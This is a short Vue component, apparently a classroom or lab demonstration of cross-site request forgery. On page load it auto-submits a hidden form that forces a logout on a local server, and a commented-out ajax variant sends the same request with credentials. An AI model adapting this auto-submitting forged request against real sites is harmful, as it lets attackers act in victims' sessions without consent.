<template>
  <div class="about">
    <h1>This is an csrf page</h1>
    <!-- <div>logout attack: {{ logout }}</div> -->
    <form id='csrf' action="http://localhost:8000/logout" method='post'></form>
  </div>
</template>
<script>
// import Vue from 'vue';

export default {
  data() {
    return {
      logout: false,
    };
  },
  // form attack
  mounted() {
    document.getElementById('csrf').submit();
  },
  // ajax attack
  // async mounted() {
  //   try {
  //     await Vue.$ajax.post('http://localhost:8000/logout', {}, { withCredentials: true });

  //     this.logout = !Vue.$checkCookie();
  //   } catch (error) {
  //     this.logout = JSON.stringify(error);
  //   }
  // },
};
</script>
